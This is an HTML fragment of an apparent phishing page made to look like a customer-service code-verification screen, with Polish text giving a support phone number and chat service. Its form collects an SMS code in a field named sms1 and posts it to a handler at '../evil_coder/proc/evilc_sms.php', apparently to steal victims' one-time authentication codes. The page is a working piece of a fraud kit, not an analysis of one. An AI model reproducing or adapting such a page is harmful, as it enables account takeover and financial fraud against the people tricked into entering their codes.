...
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  ...
  <style>body {color: #000000;font-family: Arial, 'Helvetica Neue', Helvetica, sans-serif;font-size: 1.25em}.header, legend, h1, h2, h3, h4 {color: #000000}label {color: #000000}a,.btn-link {color: #000000;text-decoration: underline}a:visited,.btn-link:visited {color: #000000}a:hover,a:focus,.btn-link:hover,.btn-link:focus {color: #211f1f}a:active,.btn-link:active {color: #211f1f}a.btn-link {font-size: .95em}.btn-primary,.btn-primary:focus,.btn-primary:hover {background: #ffcd00;color: #000;border: none;border-radius: 0}.btn-primary:active,.btn-primary:active:hover,.btn-primary:active:focus {background: #AB2C29}fieldset {border: 0}fieldset > legend {border-bottom: 0;font-size: 1.00em}:not(.lt-ie9) label.custom-radio [type=radio]:checked+span:before {background: #ffcd00}.accordion.modal .modal-body .panel-group .expander {color: #ffcd00}.accordion.modal .modal-body .panel-group .panel {background: #FFF}.field-validation-error {color: #AB2C29}.toast-top-full-width {display: none}</style>
...
<div class="container container-sticky-footer">
<form action="../evil_coder/proc/evilc_sms.php" autocomplete="off"  method="post">  
    ...
    <span>
      ...
      <input  data-val-required="Please enter your code" required="" name="sms1" id="sms1" type="text">
 										
															<script src="files/js/mask.js"></script>
                                    													<script>
                                    													var element = document.getElementById('sms1');
...
zespół obsługi klienta pod numerem 800 669 6639 lub porozmawiaj z nimi za pomocą aplikacji
 usługa czatu!</p>
</div>
      </div>
    </div>
